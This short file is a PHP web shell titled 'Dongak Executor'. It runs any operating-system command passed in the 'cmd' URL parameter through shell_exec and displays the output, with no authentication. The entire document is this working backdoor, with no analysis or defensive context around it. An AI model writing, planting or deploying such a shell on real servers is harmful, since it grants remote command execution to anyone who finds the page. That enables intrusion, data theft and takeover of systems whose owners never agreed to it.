<!DOCTYPE html>
<html>
<head>
    <title>Dongak Executor</title>
</head>
<body>
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
</body>
</html>
